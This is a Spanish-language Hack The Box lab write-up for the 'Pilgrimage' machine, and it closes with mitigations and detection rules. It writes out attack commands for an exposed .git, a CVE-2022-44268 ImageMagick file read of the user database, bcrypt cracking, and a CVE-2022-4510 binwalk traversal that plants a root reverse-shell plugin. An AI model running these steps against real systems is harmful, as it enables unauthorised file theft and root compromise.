---
machine: Pilgrimage
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, git, imagemagick, cve-2022-44268, binwalk, cve-2022-4510, privesc]
---

# Pilgrimage — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Un vhost con un acortador/redimensionador de imágenes expone `/.git`: `git-dumper` recupera el PHP y el binario `magick` (**ImageMagick 7.1.0-49**), vulnerable a **CVE-2022-44268**. Un PNG con un perfil manipulado hace que ImageMagick incruste en la imagen resultante el contenido de cualquier fichero legible: se lee `/var/db/pilgrimage`, la SQLite con el hash de `emily`, y se entra por SSH. Como root, un script `malwarescan.sh` ejecuta **binwalk 2.3.2** sobre lo que se sube; **CVE-2022-4510** (path traversal en el extractor PFS) permite escribir un plugin en la config de root y ejecutarlo.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 22,80 -sCV <IP> -oN nmap_svc.txt
```

```text
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb1u1
80/tcp open  http    nginx 1.18.0
```

```bash
echo "<IP> pilgrimage.htb" | sudo tee -a /etc/hosts
feroxbuster -u http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

## Enumeración

La raíz redirige a `pilgrimage.htb` y ofrece un formulario de subida que "reduce" imágenes. El directorio `.git` está expuesto (aunque el listado devuelva 403, `HEAD` y los objetos se sirven):

```bash
git-dumper http://pilgrimage.htb/.git ./src
cd src && git log --oneline
```

Del código salen dos datos: la base está en **`/var/db/pilgrimage`** y el redimensionado se hace invocando el binario `magick` que viaja en el propio repositorio.

```bash
./magick -version
```

```text
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64
```

Esa versión es vulnerable a **CVE-2022-44268**: al procesar un PNG con un campo de texto `profile` cuyo valor es una ruta, ImageMagick intenta leer esa ruta como perfil y, si puede, la incrusta en la salida como *Raw profile type*.

## Foothold

Se genera un PNG malicioso con el script público de la CVE apuntando a la base de datos:

```bash
python3 CVE-2022-44268.py /var/db/pilgrimage payload.png
curl -s -F 'image=@payload.png' http://pilgrimage.htb/ -o out.html
# del HTML se saca la URL del PNG reducido
curl -s http://pilgrimage.htb/shrunk/<hash>.png -o shrunk.png
identify -verbose shrunk.png | sed -n '/Raw profile type/,+1p'
```

El volcado hex se decodifica y se abre la SQLite:

```bash
python3 - <<'PY'
import binascii, re
data = open('shrunk.png','rb').read().decode('latin-1')
hexdump = ''.join(re.findall(r'[0-9a-f]{64,}', data))
open('pilgrimage.db','wb').write(binascii.unhexlify(hexdump))
PY
sqlite3 pilgrimage.db '.tables' 'select * from users;'
```

De la tabla `users` sale el hash de **`emily`**; se crackea (bcrypt) y se entra por SSH:

```bash
hashcat -m 3200 emily.hash rockyou.txt
ssh emily@pilgrimage.htb
```

## Movimiento lateral

No hay segundo host. El tránsito es web → fichero → usuario del sistema.

## Escalada de privilegios

```bash
cat /usr/sbin/malwarescan.sh
```

El script corre como root, vigila `inotifywait` sobre `/var/www/pilgrimage.htb/shrunk/` y ejecuta `binwalk -e` sobre cada fichero nuevo. La versión instalada es **binwalk 2.3.2**, afectada por **CVE-2022-4510**: el extractor de PFS no sanea la ruta de los ficheros que extrae, así que un PFS con `../` escribe fuera del directorio de extracción.

El destino útil es el directorio de plugins de la configuración de root: un `.py` colocado ahí se importa en la siguiente ejecución de binwalk, que ya corre como root.

```bash
# generar el PFS con traversal hacia /root/.config/binwalk/plugins/
python3 cve-2022-4510.py --lhost <LHOST> --lport <LPORT>
# subirlo por el formulario para que caiga en shrunk/ y lo procese el timer
```

```bash
# alternativa silenciosa: traversal de una clave pública a authorized_keys de root
```

Con el plugin cargado, el siguiente fichero que se deposite en `shrunk/` ejecuta el payload como root y devuelve la shell.

## Evidencia

- Salidas recortadas de `identify -verbose`, `sqlite3`, `cat malwarescan.sh` y `binwalk -e`.
- Sin flags, hashes ni contraseñas: los valores reales viven en `private/`.

## Lecciones aprendidas

- `/.git` con 403 en el listado no significa cerrado: `HEAD` y los objetos suelen servirse.
- Un binario dentro del repositorio es la versión exacta que corre en producción: `-version` antes de buscar CVE.
- CVE-2022-44268 no es una LFI: es una lectura a través del parser de perfiles PNG, y el dato vuelve en los metadatos.
- Un script de "malware scan" con `binwalk -e` sobre entrada de usuario es ejecución como root con pasos extra.
- `inotifywait` + `binwalk` se repite: la ventana para el traversal es cada subida.

## Mitigaciones y detección

- No exponer `.git` en producción y bloquear dotfiles en nginx.
- Actualizar ImageMagick (7.1.0-50 corrige CVE-2022-44268) y binwalk (2.3.3 corrige CVE-2022-4510); ejecutar el escaneo con un usuario sin privilegios y en un contenedor sin escritura fuera de `/tmp`.
- Validar el tipo real del fichero por magic bytes y reencodear las imágenes antes de procesarlas.
- Detección: peticiones a `/.git/`, PNG con chunks `tEXt` que contienen rutas, procesos `magick`/`binwalk` con padre root leyendo rutas del sistema, y escrituras en `~/.config/binwalk`.

MITRE: T1190 (exploit public-facing application), T1005 (data from local system), T1059.004 (Unix shell), T1548 (abuse elevation control).

## Referencias

- <https://www.hackthebox.com/machines/pilgrimage>
- <https://0xdf.gitlab.io/2023/11/25/htb-pilgrimage.html>
- <https://7rocky.github.io/en/htb/pilgrimage/>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-44268>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-4510>
